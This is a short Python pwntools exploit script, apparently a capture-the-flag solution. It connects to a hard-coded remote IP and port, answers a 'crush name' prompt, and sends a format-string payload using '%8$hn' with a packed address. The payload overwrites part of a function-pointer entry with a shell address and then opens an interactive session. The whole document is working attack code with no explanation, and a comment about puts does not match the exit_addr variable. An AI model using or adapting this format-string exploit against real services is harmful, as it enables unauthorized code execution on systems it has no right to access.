#!/usr/bin/env python
from pwn import *

r = remote('202.125.94.131', 5006)
r.recvuntil('er your crush name : ')
exit_addr = 0x000000601048
shell_addr = '0717'
# payload = puts addr + puts addr+2 + overwrite puts addr + overwrite puts addr+2

padding = 'a' * 5

p = ''
p += '%' + str(int(shell_addr, 16)) + 'c' + padding + '%8$hn'
p += p64(exit_addr)

print p
r.sendline(p)
r.interactive()
